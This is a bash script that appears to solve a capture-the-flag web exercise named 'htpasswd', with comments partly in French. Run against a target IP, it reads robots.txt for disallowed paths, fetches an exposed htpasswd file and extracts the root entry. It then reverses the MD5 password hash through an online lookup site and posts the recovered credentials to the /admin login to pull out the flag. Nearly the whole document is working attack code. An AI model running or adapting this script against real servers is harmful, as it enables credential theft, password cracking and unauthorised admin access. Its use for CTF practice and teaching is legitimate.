#!/bin/bash
#
# ./get-the-htpasswd-flag.sh "ip"
# 

theme="htpasswd"

function get_tools
{
	# $1: the command to test if here or need to install
	tool="${1}"
	which "${tool}" 2>&1 > /dev/null
	if [ $? -ne 0 ]
	then
		if [ `uname` = "Darwin" ]
		then
			brew install "${tool}"
		else
			apt-get install -y "${tool}"
		fi
		return 1
	fi
	return 0
}
get_tools "curl"

function simplified_curl_request
{
	# $1:	url/ip to test
	# $2:	queries string to test (those one which from SQL injection, pass all
	#		query string by url ($1)
	curl -svG --data-urlencode "${2}" "${1}" 
	return $?
}

function md5_reverse_decode_to_string
{
	# Si ce site web ne fonctionne plus (ce qui pourrait tout a fait arriver) ->
	# hashcat ou autre site de md5 reverse
	# $1: md5 to reverse
	curl -sG --data-urlencode "string=${1}" "https://md5.gromweb.com/?" | grep -Eo "<input class=\"field\" id=\"form_string_to_hash_string\" type=\"search\" name=\"string\" value=\"[^\"</>]*" | awk -F\" '{print $NF}'
}

function string_encode_to_md5
{
	# Si ce site web ne fonctionne plus (ce qui pourrait tout a fait arriver) ->
	# hashcat ou autre site de md5 reverse
	# $1: string to md5
	curl -sG --data-urlencode "string=${1}" "https://md5.gromweb.com/?" | grep -Eo "<input class=\"field\" id=\"form_hash_to_string_hash\" type=\"search\" name=\"md5\" value=\"[^\"</>]*" | awk -F\" '{print $NF}'
}

function get_nb_entries
{
	#$1: the datas that we need to count the units
	echo -e "${1}" | awk 'END {print NR}'
	return $?
}

function extract_url_from_html_tag
{
	# $1 url where to parse datas
	# Si le FS est ", comme en general elle vont par paire, pour recup le dernier
	# champ entre les "" il faut recup l'avant dernier field qui contiendra la data
	curl -svL "${1}" | grep -Eo "((href|src)=)\"[a-zA-Z0-9:/=&\+\?_.\(\) -]*\"" | awk -v root="${1}" -F\" '{print root $(NF-1)}'
}

echo -e "\n\033[35m5. === ${theme} ===============================================\033[0m\n"

# recup url Disallow du fichier robots.txt
result=`curl -sv "${1}/robots.txt" | grep "Disallow" | awk '{print $2}'`
let "nb_url_robots=`get_nb_entries "${result}"`"

echo -e "\nThe robots.txt file contains ${nb_url_robots} important url:\n${result}\n"

url_whatever_directory=`echo -e "${result}" | awk -v root="http://${1}" 'NR == 1 {print root $0}'`

echo -e "\nSo we are going to follow the first url:\n\033[33m${url_whatever_directory}\033[0m\n"
curl -sv "${url_whatever_directory}" 2>&1 | grep -E "HTTP/1.1"

echo -e "\n You can notice that the resource has been moved permanently, so follow the redirection:\n"
urls_whatever=`extract_url_from_html_tag "${url_whatever_directory}/"`

let "nb_url_whatever=`get_nb_entries "${urls_whatever}"`"
echo -e "\nThen, we get \033[33m${nb_url_whatever}\033[0m urls:\n\033[33m${urls_whatever}\033[0m\n"

#for (( i=1; i <= ${nb_url_whatever}; i++ ))
#do
#	url_to_follow=`echo -e "${urls_whatever}" | awk -v line="${i}" 'NR == line {print $0}'`
#	# On sait deja qu'il n'ya que 2 urls dont ../ qui renvoie a l'index
#	# principal, on va donc passer outre...
#	curl -sv "${url_to_follow}"
#	echo -e "\nThen, we make a request to ${url_to_follow}\n"
#done
url_to_htpasswd=`echo -e "${urls_whatever}" | awk -v line="${nb_url_whatever}" 'NR == line {print $0}'`
echo -e "\nAnd, we make a request to \033[33m${url_to_htpasswd}\033[0m\n"

# on recup les infos login:password du fichier htpasswd, non indexé par les
# robots
sensible_datas=`curl -sv "${url_to_htpasswd}" | grep -E "root"`
username=`echo -e "${sensible_datas}" | cut -d: -f1`
md5_password=`echo -e "${sensible_datas}" | cut -d: -f2`
md5_password_decrypted=`md5_reverse_decode_to_string "${md5_password}"`
echo -e "\nFinally, we have gotten back these datas:\n\033[33m${sensible_datas}\033[0m\nusername: \033[33m${username}\033[0m\ncrypted password: \033[33m${md5_password}\033[0m\ndecrypted password: \033[33m${md5_password_decrypted}\033[0m\n"

# On a aussi un 301 sur admin
# Requete POST de connexion a la page admin, comme il y a une redirection 301
# que l'on suit grace a -L, il faut egalement repreciser qu'on souhaite une
# requete post, sinon c'est get qui est réémis quand redirection, avec curl
htpasswd_flag=`curl -vLs --post301  --data-urlencode "Login=Login" --data-urlencode "username=${username}" --data-urlencode "password=${md5_password_decrypted}" "${1}/admin" | grep -Eo "The flag is : [a-zA-Z0-9]*" | awk '{print $NF}'`
echo -e "\nThe flag earned is:"
echo -e "\033[31m"${htpasswd_flag}"\033[0m"
# ce qui est marrant c'est qu'on obtient le flag, mais on a une erreur 500
echo -e "\n\$\$\$ ${theme} \$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\n"
